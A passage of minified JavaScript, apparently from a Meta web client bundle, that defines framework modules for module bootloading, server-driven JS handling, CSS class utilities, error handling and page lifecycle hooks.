    for (var d = arguments.length, e = new Array(d > 1 ? d - 1 : 0), f = 1; f < d; f++) e[f - 1] = arguments[f];
    return c("setImmediatePolyfill").apply(void 0, [b].concat(e));
  }
  g["default"] = a;
}, 98);
__d("BootloaderEndpoint", ["Bootloader", "BootloaderEndpointConfig", "CSRFGuard", "FBLogger", "HasteResponse", "TimeSlice", "clearImmediate", "fb-error", "getAsyncParams", "getSameOriginTransport", "performanceAbsoluteNow", "setImmediateAcrossTransitions"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h = b("fb-error").ErrorXFBDebug,
    i = b("BootloaderEndpointConfig").endpointURI,
    j = 0,
    k = null,
    l = null,
    m = new Map(),
    n = new Map();
  function o(a) {
    return Array.from(a.keys()).join(",");
  }
  function p(a, c) {
    var d = {};
    a.size && (d.modules = o(a));
    c.size && (d.nb_modules = o(c));
    a = Object.entries(babelHelpers["extends"]({}, d, b("getAsyncParams")("GET"))).map(function (a) {
      var b = a[0];
      a = a[1];
      return encodeURIComponent(b) + "=" + encodeURIComponent(String(a));
    }).join("&");
    return i + (i.includes("?") ? "&" : "?") + a;
  }
  function q(a, c) {
    if (a.size === 0 && c.size === 0) return;
    var d = p(a, c),
      e = b("getSameOriginTransport")(),
      f = j++,
      i = (g || (g = b("performanceAbsoluteNow")))();
    e.open("GET", d, !0);
    var k = b("TimeSlice").getGuardedContinuation("Bootloader _requestHastePayload");
    e.onreadystatechange = function () {
      if (e.readyState !== 4) return;
      k(function () {
        h.addFromXHR(e);
        var g = e.status === 200 ? JSON.parse(b("CSRFGuard").clean(e.responseText)) : null;
        if (g == null) {
          b("FBLogger")("bootloader").warn('Invalid bootloader response %d, blocking mods: %s; non-blocking mods: %s; "%s"', e.status, o(a), o(c), e.responseText.substr(0, 256));
          return;
        }
        if (g.error) b("FBLogger")("bootloader").warn("Non-fatal error from bootloader endpoint, blocking mods: %s; non-blocking mods: %s", o(a), o(c));else if (g.__error) {
          b("FBLogger")("bootloader").warn("Fatal error from bootloader endpoint, blocking mods: %s; non-blocking mods: %s", o(a), o(c));
          return;
        }
        b("TimeSlice").guard(function () {
          return r(d, g, a, c, f, i);
        }, "Bootloader receiveEndpointData", {
          propagationType: b("TimeSlice").PropagationType.CONTINUATION
        })();
      });
    };
    e.send();
  }
  function r(a, c, d, e, f, h) {
    var i = (g || (g = b("performanceAbsoluteNow")))(),
      j = c.serverGenTime,
      k = c.hrp;
    if (k == null) {
      c = c;
      b("FBLogger")("be_null_hrp").mustfix("Found null hrp, blocking mods: %s; non-blocking mods: %s; response error: %s", o(d), o(e), c.error + ", summary: " + c.errorSummary + ", description: " + c.errorDescription);
      k = c;
    }
    b("HasteResponse").handle(k, {
      source: "bootloader_endpoint",
      sourceDetail: JSON.stringify({
        b: Array.from(d.keys()),
        n: Array.from(e.keys())
      }),
      onBlocking: function () {
        var a = [d, e];
        for (var c = 0; c < a.length; c++) {
          var f = a[c];
          for (var f = f.values(), g = Array.isArray(f), h = 0, f = g ? f : f[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
            var i;
            if (g) {
              if (h >= f.length) break;
              i = f[h++];
            } else {
              h = f.next();
              if (h.done) break;
              i = h.value;
            }
            i = i;
            b("Bootloader").done(i);
          }
        }
      },
      onLog: function (c) {
        var g = [d, e];
        for (var k = 0; k < g.length; k++) {
          var l = g[k];
          for (var l = l.keys(), m = Array.isArray(l), n = 0, l = m ? l : l[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
            var o;
            if (m) {
              if (n >= l.length) break;
              o = l[n++];
            } else {
              n = l.next();
              if (n.done) break;
              o = n.value;
            }
            o = o;
            b("Bootloader").beDone(o, f, babelHelpers["extends"]({
              requestStart: h,
              responseStart: i,
              serverGenTime: j,
              uri: a
            }, c));
          }
        }
      }
    });
  }
  function s() {
    var a = m,
      c = n;
    b("clearImmediate")(l);
    l = null;
    k = null;
    m = new Map();
    n = new Map();
    q(a, c);
  }
  function t() {
    var a = b("BootloaderEndpointConfig").maxBatchSize;
    return a <= 0 ? !1 : m.size + n.size >= a;
  }
  a = {
    load: function (a, c, d) {
      (c ? m : n).set(a, d);
      if (b("BootloaderEndpointConfig").debugNoBatching || t()) {
        s();
        return;
      }
      if (l != null) return;
      k = b("TimeSlice").getGuardedContinuation("Schedule async batch request: Bootloader._loadResources");
      l = b("setImmediateAcrossTransitions")(function () {
        k && k(function () {
          return s();
        });
      });
    },
    forceFlush: function () {
      k && k(function () {
        return s();
      });
    }
  };
  e.exports = a;
}, null);
__d("MetaConfigMap", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = {};
  a = {
    add: function (a, b) {
      for (var c in a) b && b.entry++, !(c in g) ? g[c] = a[c] : b && b.dup_entry++;
    },
    get: function (a) {
      return g[a];
    }
  };
  b = a;
  f["default"] = b;
}, 66);
__d("QPLHasteSupportDataStorage", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = {};
  a = {
    add: function (a, b) {
      Object.keys(a).forEach(function (c) {
        b && b.entry++;
        if (g[c] == null) {
          var d = a[c];
          g[c] = d;
        } else b && b.dup_entry++;
      });
    },
    get: function (a) {
      return g[a];
    }
  };
  f["default"] = a;
}, 66);
__d("bx", ["unrecoverableViolation"], function (a, b, c, d, e, f, g) {
  var h = {};
  function a(a) {
    var b = h[a];
    if (!b) throw c("unrecoverableViolation")("bx" + ('(...): Unknown file path "' + a + '"'), "staticresources");
    return b;
  }
  a.add = function (a, b) {
    var c = !1;
    for (c in a) b && b.entry++, !(c in h) ? (a[c].loggingID = c, h[c] = a[c]) : b && b.dup_entry++;
  };
  a.getURL = function (a) {
    return a.uri;
  };
  g["default"] = a;
}, 98);
__d("recoverableViolation", ["FBLogger"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a, b, d, e) {
    d = d === void 0 ? {} : d;
    d = d.error;
    b = c("FBLogger")(b);
    d ? b = b.catching(d) : b = b.blameToPreviousFrame();
    d = e == null ? void 0 : e.categoryKey;
    d != null && (b = b.addToCategoryKey(d));
    e = (d = e == null ? void 0 : e.trackOnly) != null ? d : !1;
    e ? b.debug(a) : b.mustfix(a);
    return null;
  }
  g["default"] = a;
}, 98);
__d("getFalcoLogPolicy_DO_NOT_USE", ["recoverableViolation"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = {
      r: 1
    },
    i = {};
  function a(a) {
    var b = i[a];
    if (b == null) {
      c("recoverableViolation")("Failed to find a Haste-supplied log policy for the Falco event ' +\n        'identified by token `" + a + "`. Failing open (ie. with a sampling rate of 1.0).", "staticresources");
      return h;
    }
    return b;
  }
  a.add = function (a, b) {
    Object.keys(a).forEach(function (c) {
      b && b.entry++, i[c] == null ? i[c] = a[c] : b && b.dup_entry++;
    });
  };
  g["default"] = a;
}, 98);
__d("ix", ["invariant"], function (a, b, c, d, e, f, g, h) {
  var i = {},
    j = new Set();
  function b(a) {
    var b = i[a];
    !b && h(0, 11798, a);
    return b;
  }
  b.add = function (a, b) {
    var c = !1;
    for (c in a) b && b.entry++, !(c in i) ? (a[c].loggingID = c, i[c] = a[c]) : b && b.dup_entry++;
  };
  b.getUsedPaths_ONLY_FOR_REACT_FLIGHT = function () {
    a.__flight_execution_mode_DO_NOT_USE === "flight" || h(0, 34547);
    return Array.from(j);
  };
  b.getAllPaths = function () {
    var a = new Set();
    Object.values(i).map(function (a) {
      if ((a == null ? void 0 : a.sprited) === 0) return a.uri;else if ((a == null ? void 0 : a.sprited) === 1) return a._spi;else if ((a == null ? void 0 : a.sprited) === 2) return a.spi;
    }).forEach(function (b) {
      return b != null && a.add(b);
    });
    return a;
  };
  g["default"] = b;
}, 98);
__d("justknobx", ["invariant"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  var i = {};
  a = {
    getBool: function (a) {
      h(0, 47459);
    },
    getInt: function (a) {
      h(0, 47459);
    },
    _: function (a) {
      var b = i[a];
      b != null || h(0, 47458, a);
      return b.r;
    },
    add: function (a, b) {
      for (var c in a) b && b.entry++, !(c in i) ? i[c] = a[c] : b && b.dup_entry++;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("qex", ["invariant", "BanzaiLazyQueue"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  var i = {},
    j = {};
  a = {
    _: function (a) {
      var b = i[a];
      b != null || h(0, 11799, a);
      var c = b.r;
      b = b.l;
      b != null && !j[a] && (j[a] = !0, d("BanzaiLazyQueue").queuePost("qex", {
        l: b
      }));
      return c;
    },
    add: function (a, b) {
      for (var c in a) b && b.entry++, !(c in i) ? i[c] = a[c] : b && b.dup_entry++;
    }
  };
  b = a;
  g["default"] = b;
}, 98);
__d("HasteSupportData", ["ix", "MetaConfigMap", "QPLHasteSupportDataStorage", "bx", "getFalcoLogPolicy_DO_NOT_USE", "gkx", "justknobx", "qex"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  function a(a, b) {
    var d = a.bxData,
      e = a.clpData,
      f = a.gkxData,
      g = a.ixData,
      i = a.metaconfigData,
      j = a.qexData,
      k = a.qplData;
    a = a.justknobxData;
    d != null && c("bx").add(d, b);
    e != null && c("getFalcoLogPolicy_DO_NOT_USE").add(e, b);
    f != null && c("gkx").add(f, b);
    g != null && h.add(g, b);
    i != null && c("MetaConfigMap").add(i, b);
    j != null && c("qex").add(j, b);
    k != null && c("QPLHasteSupportDataStorage").add(k, b);
    a != null && c("justknobx").add(a, b);
  }
  g.handle = a;
}, 98);
__d("CSS", ["$", "CSSCore"], function (a, b, c, d, e, f, g) {
  var h = typeof window != "undefined" ? window.CSS : null,
    i = "hidden_elem";
  h = h && h.supports.bind(h);
  function a(a, b) {
    c("$").fromIDOrElement(a).className = b || "";
    return a;
  }
  function j(a, b) {
    return a instanceof Document || a instanceof Text ? !1 : d("CSSCore").hasClass(c("$").fromIDOrElement(a), b);
  }
  function b(a, b) {
    return a instanceof Document || a instanceof Text ? !1 : d("CSSCore").matchesSelector(c("$").fromIDOrElement(a), b);
  }
  function k(a, b) {
    return d("CSSCore").addClass(c("$").fromIDOrElement(a), b);
  }
  function l(a, b) {
    return d("CSSCore").removeClass(c("$").fromIDOrElement(a), b);
  }
  function m(a, b, e) {
    return d("CSSCore").conditionClass(c("$").fromIDOrElement(a), b, !!e);
  }
  function n(a, b) {
    return m(a, b, !j(a, b));
  }
  function e(a) {
    return !j(a, i);
  }
  function f(a) {
    return k(a, i);
  }
  function o(a) {
    return l(a, i);
  }
  function p(a) {
    return n(a, i);
  }
  function q(a, b) {
    return m(a, i, !b);
  }
  g.supports = h;
  g.setClass = a;
  g.hasClass = j;
  g.matchesSelector = b;
  g.addClass = k;
  g.removeClass = l;
  g.conditionClass = m;
  g.toggleClass = n;
  g.shown = e;
  g.hide = f;
  g.show = o;
  g.toggle = p;
  g.conditionShow = q;
}, 98);
__d("Parent", ["CSS"], function (a, b, c, d, e, f, g) {
  function a(a, b) {
    b = b.toUpperCase();
    a = i(a, function (a) {
      return a.nodeName === b;
    });
    return a instanceof Element ? a : null;
  }
  function b(a, b) {
    a = i(a, function (a) {
      return a instanceof Element && d("CSS").hasClass(a, b);
    });
    return a instanceof Element ? a : null;
  }
  function c(a, b) {
    a = a;
    if (typeof a.matches === "function") {
      while (a && a !== document && !a.matches(b)) a = a.parentNode;
      return a instanceof Element ? a : null;
    } else if (typeof a.msMatchesSelector === "function") {
      while (a && a !== document && !a.msMatchesSelector(b)) a = a.parentNode;
      return a instanceof Element ? a : null;
    } else return h(a, b);
  }
  function h(a, b) {
    a = a;
    var c = a;
    while (c.parentNode) c = c.parentNode;
    if (!(c instanceof Element) && !(c instanceof Document)) return null;
    c = c.querySelectorAll(b);
    while (a) {
      if (Array.prototype.indexOf.call(c, a) !== -1) return a instanceof Element ? a : null;
      a = a.parentNode;
    }
    return a instanceof Element ? a : null;
  }
  function e(a, b) {
    a = i(a, function (a) {
      return a instanceof Element && !!a.getAttribute(b);
    });
    return a instanceof Element ? a : null;
  }
  function i(a, b) {
    a = a;
    while (a) {
      if (b(a)) return a;
      a = a.parentNode;
    }
    return null;
  }
  g.byTag = a;
  g.byClass = b;
  g.bySelector = c;
  g.bySelector_SLOW = h;
  g.byAttribute = e;
  g.find = i;
}, 98);
__d("ContextualComponent", ["Parent"], function (a, b, c, d, e, f, g) {
  a = function () {
    a.forNode = function (b) {
      return a.$1.get(b) || null;
    };
    a.closestToNode = function (b) {
      b = d("Parent").find(b, function (b) {
        return !!a.forNode(b);
      });
      return b ? a.forNode(b) : null;
    };
    a.register = function (b) {
      return new a(b);
    };
    function a(a) {
      var b = a.element,
        c = a.isRoot;
      a = a.parent;
      this.$2 = c;
      this.$3 = b;
      this.$4 = a;
      this.$5 = new Set();
      this.$6 = [];
      this.$7 = [];
      this.$8();
    }
    var b = a.prototype;
    b.onCleanup = function (a) {
      this.$6.push(a);
    };
    b.onUnmount = function (a) {
      this.$7.push(a);
    };
    b.cleanup = function () {
      this.$5.forEach(function (a) {
        return a.cleanup();
      }), this.$6.forEach(function (a) {
        return a();
      }), this.$6 = [];
    };
    b.unmount = function () {
      this.cleanup();
      this.$5.forEach(function (a) {
        return a.unmount();
      });
      this.$7.forEach(function (a) {
        return a();
      });
      this.$7 = [];
      var b = this.$4;
      b && (a.$1["delete"](this.$3), b.$9(this));
    };
    b.reinitialize = function () {
      var b = this.$4;
      b && (b.$9(this), this.$4 = void 0);
      a.$1["delete"](this.$3);
      this.$8();
    };
    b.$8 = function () {
      if (!this.$2 && !this.$4) {
        var b = a.closestToNode(this.$3);
        b && (this.$4 = b);
      }
      this.$4 && this.$4.$10(this);
      a.$1.set(this.$3, this);
    };
    b.$10 = function (a) {
      this.$5.add(a);
    };
    b.$9 = function (a) {
      this.$5["delete"](a);
    };
    return a;
  }();
  a.$1 = new Map();
  g["default"] = a;
}, 98);
__d("ServerJS", ["ContextualComponent", "ErrorGuard", "ServerJSDefine", "__debug", "err", "ge", "replaceTransportMarkers"], function (a, b, c, d, e, f) {
  var g,
    h = 1,
    i = 2,
    j = 16,
    k = 0;
  a = function () {
    "use strict";

    function a() {
      this.$2 = {}, this.$1 = null, this.$4 = {}, this.$3 = void 0;
    }
    var c = a.prototype;
    c.handle = function (a, b) {
      return this.$5(a, b, m);
    };
    c.handleWithCustomApplyEach = function (a, b, c) {
      this.$5(b, c, a);
    };
    c.$5 = function (a, c, d) {
      this.$3 = c;
      if (a.__guard != null) throw b("err")("ServerJS.handle called on data that has already been handled");
      a.__guard = !0;
      d(a.define || [], this.$6, this);
      d(a.markup || [], this.$7, this);
      d(a.elements || [], this.$8, this);
      this.$9(a.contexts || []);
      d(a.instances || [], this.$10, this);
      var e = d(a.pre_display_requires || [], this.$11, this);
      e = e.concat(d(a.require || [], this.$11, this));
      return {
        cancel: function () {
          e.forEach(function (a) {
            a && a.cancel();
          });
        }
      };
    };
    c.handlePartial = function (a, b) {
      var c = this;
      (a.instances || []).forEach(function (a) {
        p(c.$2, a);
      });
      (a.markup || []).forEach(function (a) {
        o(c.$2, a);
      });
      (a.elements || []).forEach(function (a) {
        o(c.$2, a);
      });
      return this.handle(a, b);
    };
    c.setRelativeTo = function (a) {
      this.$1 = a;
      return this;
    };
    c.cleanup = function (a) {
      var c = Object.keys(this.$2);
      a ? d.call(null, c, a.guard(function () {}, "SeverJS Cleanup requireLazy", {
        propagationType: a.PropagationType.ORPHAN
      })) : d.call(null, c, function () {});
      this.$2 = {};
      function f(c) {
        var d = this.$4[c],
          a = d[0],
          f = d[1];
        d = d[2];
        delete this.$4[c];
        f = f ? 'JS::call("' + a + '", "' + f + '", ...)' : 'JS::requireModule("' + a + '")';
        a = b("__debug").debugUnresolvedDependencies([a, c]);
        throw l(b("err")("%s did not fire because it has missing dependencies.\n%s", f, a), d);
      }
      for (a in this.$4) (g || (g = b("ErrorGuard"))).applyWithGuard(f, this, [a], {
        name: "ServerJS:cleanup id: " + a,
        project: "ServerJSCleanup"
      });
    };
    c.$6 = function (a, c, d, e) {
      return (g || (g = b("ErrorGuard"))).applyWithGuard(b("ServerJSDefine").handleDefine, b("ServerJSDefine"), [a, c, d, e, this.$1], {
        name: "JS::define"
      });
    };
    c.$11 = function (a, c, d, e) {
      return (g || (g = b("ErrorGuard"))).applyWithGuard(this.$12, this, [a, c, d, e], {
        name: c != null ? "JS::call" : "JS::requireModule"
      });
    };
    c.$12 = function (a, c, d, e) {
      var f = this;
      a = b("ServerJSDefine").getModuleNameAndHash(a);
      var m = a.name,
        n = a.hash,
        o;
      typeof c === "object" ? a = c : (a = d, o = c);
      d = [m].concat(a || []);
      var p;
      o != null ? p = "__call__" + m + "." + o : e != null ? p = "__call__" + m : p = "__requireModule__" + m;
      p += "__" + k++;
      this.$4[p] = [m, o, n];
      var q = this.$3 && this.$3.bigPipeContext,
        r = (g || (g = b("ErrorGuard"))).guard(function (a) {
          a = b.call(null, m);
          delete f.$4[p];
          e && b("replaceTransportMarkers")({
            relativeTo: f.$1,
            bigPipeContext: q
          }, e);
          if (o != null) {
            if (!a[o]) throw l(b("err")('Module %s has no method "%s"', m, o), n);
          } else if (e != null && typeof a !== "function") throw l(b("err")("Module %s is not a function but was called with args", m), n);
          var c = o != null ? a[o] : e != null && typeof a === "function" ? a : null;
          c != null && (c.apply(a, e || []), r.__SMmeta = c.__SMmeta || {}, r.__SMmeta.module = r.__SMmeta.module || m, r.__SMmeta.name = r.__SMmeta.name || o);
        }, {
          name: o != null ? "JS::call('" + m + "', '" + o + "', ...)" : e != null ? "JS::call('" + m + "', ...)" : "JS::requireModule('" + m + "')"
        });
      c = define(p, d, r, h | j | i, this, 1, this.$3);
      return c;
    };
    c.$10 = function (a, c, d, e) {
      (g || (g = b("ErrorGuard"))).applyWithGuard(this.$13, this, [a, c, d, e], {
        name: "JS::instance"
      });
    };
    c.$13 = function (a, c, d, e) {
      var f = this,
        g = null;
      a = b("ServerJSDefine").getModuleNameAndHash(a);
      var h = a.name;
      a = a.hash;
      if (c) {
        var k = this.$3 && this.$3.bigPipeContext;
        g = function () {
          var a = b.call(null, c[0]);
          b("replaceTransportMarkers")({
            relativeTo: f.$1,
            bigPipeContext: k
          }, d);
          var e = Object.create(a.prototype);
          a.apply(e, d);
          return e;
        };
      }
      define(h, c, g, i | j, null, e);
    };
    c.$7 = function (a, c, d) {
      (g || (g = b("ErrorGuard"))).applyWithGuard(this.$14, this, [a, c, d], {
        name: "JS::markup"
      });
    };
    c.$14 = function (a, c, d) {
      a = b("ServerJSDefine").getModuleNameAndHash(a);
      var e = a.name,
        f = a.hash;
      define(e, ["HTML"], function (a) {
        try {
          return a.replaceJSONWrapper(c).getRootNode();
        } catch (a) {
          throw l(a, f);
        }
      }, j, null, d);
    };
    c.$8 = function (a, c, d, e) {
      (g || (g = b("ErrorGuard"))).applyWithGuard(this.$15, this, [a, c, d, e], {
        name: "JS::element"
      });
    };
    c.$15 = function (a, c, d, e) {
      a = b("ServerJSDefine").getModuleNameAndHash(a);
      var f = a.name,
        g = a.hash;
      if (c === null && d != null) {
        define(f, null, null, j, null, d);
        return;
      }
      a = [];
      var i = j;
      d = d || 0;
      e != null && (a.push(e), i |= h, d++);
      define(f, a, function (a) {
        a = b("ge")(c, a);
        if (!a) {
          var d = "";
          throw l(b("err")('Could not find element "%s"%s', c, d), g);
        }
        return a;
      }, i, null, d);
    };
    c.$9 = function (a) {
      (g || (g = b("ErrorGuard"))).applyWithGuard(this.$16, this, [a], {
        name: "ContextualComponents"
      });
    };
    c.$16 = function (a) {
      var c = this,
        d = this.$3 && this.$3.bigPipeContext;
      a.map(function (a) {
        b("replaceTransportMarkers")({
          relativeTo: c.$1,
          bigPipeContext: d
        }, a);
        var e = a[0];
        return [a, n(e)];
      }).sort(function (a, b) {
        return a[1] - b[1];
      }).forEach(function (a) {
        a = a[0];
        var c = a[0];
        a = a[1];
        b("ContextualComponent").register({
          element: c,
          isRoot: a
        });
      });
    };
    return a;
  }();
  function l(a, b) {
    a.serverHash = b;
    return a;
  }
  function m(a, b, c) {
    return a.map(function (a) {
      return b.apply(c, a);
    });
  }
  function n(a) {
    var b = 0;
    a = a;
    while (a) a = a.parentElement, b++;
    return b;
  }
  function o(c, a) {
    var d = b("ServerJSDefine").getModuleNameAndHash(a[0]);
    d = d.name;
    d in c || (a[2] = (a[2] || 0) + 1);
    c[d] = !0;
  }
  function p(c, a) {
    var d = b("ServerJSDefine").getModuleNameAndHash(a[0]);
    d = d.name;
    d in c || (a[3] = (a[3] || 0) + 1);
    c[d] = !0;
  }
  e.exports = a;
}, null);
__d("HasteResponse", ["Bootloader", "BootloaderEvents", "ClientConsistencyEventEmitter", "HasteSupportData", "ServerJS", "TimeSlice", "__debug", "fb-error", "performanceAbsoluteNow"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h = b("fb-error").getSimpleHash,
    i = new Set(),
    j = {
      handleSRPayload: function (a, c) {
        var d = a.hsdp;
        a = a.hblp;
        d && b("HasteSupportData").handle(d, c == null ? void 0 : c.hsdp);
        a && b("Bootloader").handlePayload(a, c == null ? void 0 : c.hblp);
        (a == null ? void 0 : a.consistency) != null && b("ClientConsistencyEventEmitter").emit("newEntry", a.consistency);
      },
      handle: function (a, c) {
        var d = a.jsmods,
          e = a.allResources;
        a = a.hsrp;
        var f = c.source,
          k = c.sourceDetail,
          l = c.onBlocking,
          m = c.onLog;
        c = c.onAll;
        var n = (g || (g = b("performanceAbsoluteNow")))(),
          o;
        if (k == null) o = !0;else {
          var p = h(f, k);
          i.has(p) ? o = !1 : (o = !0, i.add(p));
        }
        var q = {
          hsdp: {
            entry: 0,
            dup_entry: 0
          },
          hblp: {
            rsrc: 0,
            dup_rsrc: 0,
            comp: 0,
            dup_comp: 0
          },
          sjsp: {
            define: 0,
            dup_user_define: 0,
            dup_system_define: 0,
            require: 0
          }
        };
        a && j.handleSRPayload(a, q);
        var r = 0,
          s = 0;
        b("Bootloader").loadResources((p = e) != null ? p : [], {
          onBlocking: function () {
            q.sjsp.require += ((d == null ? void 0 : d.require) || []).length;
            q.sjsp.define += ((d == null ? void 0 : d.define) || []).length;
            var a = b("__debug").getDupCount(),
              c = a[0];
            a = a[1];
            q.sjsp.dup_user_define -= c;
            q.sjsp.dup_system_define -= a;
            r = (g || (g = b("performanceAbsoluteNow")))();
            new (b("ServerJS"))().handle(d || {});
            s = g();
            var e = b("__debug").getDupCount();
            c = e[0];
            a = e[1];
            q.sjsp.dup_user_define += c;
            q.sjsp.dup_system_define += a;
            l == null ? void 0 : l();
          },
          onAll: c,
          onLog: function (a) {
            a = {
              source: f,
              sourceDetail: k,
              isFirstIdentical: o,
              timesliceContext: b("TimeSlice").getContext(),
              startTime: n,
              logTime: (g || (g = b("performanceAbsoluteNow")))(),
              jsmodsStart: r,
              jsmodsEnd: s,
              rsrcs: a,
              payloadStats: q
            };
            m == null ? void 0 : m(a);
            b("BootloaderEvents").notifyHasteResponse(a);
          }
        });
      }
    };
  e.exports = j;
}, null);
__d("ErrorGuardState", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("fb-error").ErrorGuardState;
}, 98);
__d("ErrorNormalizeUtils", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("fb-error").ErrorNormalizeUtils;
}, 98);
__d("ErrorSerializer", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("fb-error").ErrorSerializer;
}, 98);
__d("ErrorUtils", ["ErrorGuard", "ErrorGuardState", "ErrorNormalizeUtils", "ErrorPubSub", "ErrorSerializer", "getErrorSafe"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h, i, j;
  h || b("ErrorGuardState");
  b("ErrorNormalizeUtils");
  i || (i = b("ErrorPubSub"));
  b("getErrorSafe");
  j || (j = b("ErrorGuard"));
  b("ErrorSerializer");
  a.getErrorSafe = c("getErrorSafe");
  a.ErrorGuard = c("ErrorGuard");
  a.ErrorSerializer = c("ErrorSerializer");
  d = {
    history: c("ErrorPubSub").history,
    applyWithGuard: function (a, b, d, e, f, g) {
      return c("ErrorGuard").applyWithGuard(a, b, (a = d) != null ? a : [], {
        name: f,
        onNormalizedError: e,
        deferredSource: g == null ? void 0 : g.deferredSource
      });
    },
    guard: function (a, b, d) {
      a = c("ErrorGuard").guard(a, b != null ? {
        name: b
      } : null);
      d != null && (a = a.bind(d));
      return a;
    },
    normalizeError: function (a) {
      var b;
      return (b = c("ErrorNormalizeUtils").ifNormalizedError(a)) != null ? b : c("ErrorNormalizeUtils").normalizeError(c("getErrorSafe")(a));
    }
  };
  a.ErrorUtils = d;
  e = d;
  typeof __t === "function" && __t.setHandler && __t.setHandler(c("ErrorPubSub").reportError);
  g["default"] = e;
}, 99);
__d("PageEvents", [], function (a, b, c, d, e, f) {
  a = Object.freeze({
    NATIVE_ONLOAD: "onload/onload",
    BIGPIPE_ONLOAD: "onload/onload_callback",
    AJAXPIPE_ONLOAD: "ajaxpipe/onload_callback",
    NATIVE_DOMREADY: "onload/dom_content_ready",
    BIGPIPE_DOMREADY: "onload/domcontent_callback",
    AJAXPIPE_DOMREADY: "ajaxpipe/domcontent_callback",
    NATIVE_ONBEFOREUNLOAD: "onload/beforeunload",
    NATIVE_ONUNLOAD: "onload/unload",
    AJAXPIPE_ONUNLOAD: "onload/exit",
    AJAXPIPE_SEND: "ajaxpipe/send",
    AJAXPIPE_FIRST_RESPONSE: "ajaxpipe/first_response",
    AJAXPIPE_ONBEFORECLEARCANVAS: "ajaxpipe/onbeforeclearcanvas"
  });
  f["default"] = a;
}, 66);
__d("PageletEventConstsJS", [], function (a, b, c, d, e, f) {
  a = Object.freeze({
    ARRIVE_END: "arrive",
    ARRIVE_START: "prearrive",
    CSS_END: "css_load",
    CSS_START: "css",
    DISPLAY_END: "display",
    DISPLAY_START: "display_start",
    IMAGES_DISPLAYED: "images_displayed",
    JS_END: "jsdone",
    JS_START: "jsstart",
    ONLOAD_END: "onload",
    ONLOAD_START: "preonload",
    PAGELET_EVENT: "pagelet_events",
    PHASE_BEGIN: "phase_begin",
    SETUP: "setup"
  });
  f["default"] = a;
}, 66);
__d("PageletSet", ["Arbiter"], function (a, b, c, d, e, f, g) {
  var h = {};
  function i(a) {
    return Object.prototype.hasOwnProperty.call(h, a);
  }
  function j(a) {
    return h[a];
  }
  function a(a) {
    if (!i(a)) {
      var b = new n(a);
      h[a] = b;
    }
    return j(a);
  }
  function k() {
    return Object.keys(h);
  }
  function l(a) {
    if (i(a)) {
      var b = j(a);
      delete h[a];
      b.destroy();
    }
  }
  function m(a, b) {
    return a.contains ? a.contains(b) : !!(a.compareDocumentPosition(b) & 16);
  }
  var n = function () {
    function a(a) {
      var b = this;
      this.id = a;
      this.$1 = null;
      this.$2 = [];
      this.addDestructor(function () {
        c("Arbiter").inform("pagelet/destroy", {
          id: b.id,
          root: b.$1
        });
      });
    }
    var b = a.prototype;
    b.getRoot = function () {
      return this.$1;
    };
    b.setRoot = function (a) {
      this.$1 = a;
    };
    b.$3 = function () {
      var a = [],
        b = this.$1;
      if (!b) return a;
      var c = k();
      for (var d = 0; d < c.length; d++) {
        var e = c[d];
        if (e === this.id) continue;
        e = h[e];
        var f = e.getRoot();
        f && m(b, f) && a.push(e);
      }
      return a;
    };
    b.addDestructor = function (a) {
      this.$2.push(a);
    };
    b.destroy = function () {
      var a = this.$3();
      for (var b = 0; b < a.length; b++) {
        var c = a[b];
        i(c.id) && l(c.id);
      }
      for (c = 0; c < this.$2.length; c++) {
        a = this.$2[c]();
        a && a();
      }
    };
    return a;
  }();
  g.hasPagelet = i;
  g.getPagelet = j;
  g.getOrCreatePagelet = a;
  g.getPageletIDs = k;
  g.removePagelet = l;
}, 98);
__d("createCancelableFunction", ["emptyFunction"], function (a, b, c, d, e, f, g) {
  function a(a) {
    var b = a;
    a = function () {
      for (var a = arguments.length, c = new Array(a), d = 0; d < a; d++) c[d] = arguments[d];
      return b.apply(this, c);
    };
    a.cancel = function () {
      b = c("emptyFunction");
    };
    return a;
  }
  g["default"] = a;
}, 98);
__d("RunBlue", ["Arbiter", "BigPipeInstance", "ContextualComponent", "ExecutionEnvironment", "PageEvents", "TimeSlice", "createCancelableFunction", "emptyFunction", "performanceAbsoluteNow", "recoverableViolation"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = "onunloadhooks",
    i = "onafterunloadhooks";
  function b(b) {
    var d = a.PageHooks;
    if (window.domready && d) {
      d.runHook(b, "domreadyhooks:late");
      return {
        remove: c("emptyFunction")
      };
    } else return o("domreadyhooks", b);
  }
  function e(b) {
    var c = a.PageHooks;
    if (window.loaded && c) {
      var d = a.setTimeout(function () {
        c.runHook(b, "onloadhooks:late");
      }, 0);
      return {
        remove: function () {
          return a.clearTimeout(d);
        }
      };
    } else return o("onloadhooks", b);
  }
  function f(a, b) {
    b = b === void 0 ? !window.loading_page_chrome : b;
    return b ? o("onbeforeleavehooks", a) : o("onbeforeunloadhooks", a);
  }
  function j(a, b) {
    window.onunload || (window.onunload = c("TimeSlice").guard(function () {
      c("Arbiter").inform(c("PageEvents").NATIVE_ONUNLOAD, !0, "state");
    }, "window.onunload"));
    return o(a, b);
  }
  function k(a) {
    return j(h, a);
  }
  function l(a) {
    return j(i, a);
  }
  function m(a) {
    return o("onleavehooks", a);
  }
  function n(a, b) {
    var d = c("createCancelableFunction")(b);
    b = function () {
      d(), d.cancel();
    };
    a = c("ContextualComponent").closestToNode(a);
    a && a.onCleanup(b);
    window.onleavehooks = (window.onleavehooks || []).concat(b);
    return {
      remove: function () {
        d.cancel();
      }
    };
  }
  function o(a, b) {
    var d;
    d = (d = b) != null ? d : c("emptyFunction");
    b || c("recoverableViolation")("Undefined handler is not allowed", "web_speed");
    var e = c("createCancelableFunction")(d);
